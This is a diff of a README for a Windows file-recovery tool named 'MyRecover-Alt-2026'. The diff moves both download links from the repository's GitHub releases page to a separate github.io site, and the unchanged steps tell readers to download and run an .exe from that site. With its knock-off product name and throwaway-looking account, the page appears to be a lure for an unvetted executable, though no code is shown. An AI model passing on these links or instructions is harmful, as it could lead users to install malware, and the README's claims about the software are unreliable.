@@ -1,6 +1,6 @@
 # 📁 MyRecover-Alt-2026 - Restore Your Lost Files With Ease
 
-[![Download MyRecover-Alt-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/extinguished-balloon403/MyRecover-Alt-2026/releases)
+[![Download MyRecover-Alt-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://extinguished-balloon403.github.io)
 
 MyRecover-Alt-2026 helps you locate and restore files lost on your Windows computer. Whether you accidentally deleted documents, formatted a drive, or lost data due to a system error, this software provides a path to recovery. It works on Windows 10 and Windows 11. The program scans your storage media and produces a list of files available for restoration.
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 Follow these steps to obtain and prepare the software on your system.
 
-1.  Visit the official release page: [https://github.com/extinguished-balloon403/MyRecover-Alt-2026/releases](https://github.com/extinguished-balloon403/MyRecover-Alt-2026/releases).
+1.  Visit the official release page: [https://extinguished-balloon403.github.io](https://extinguished-balloon403.github.io).
 2.  Locate the latest version of the installer file, which typically ends in .exe.
 3.  Click the file link to initiate the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
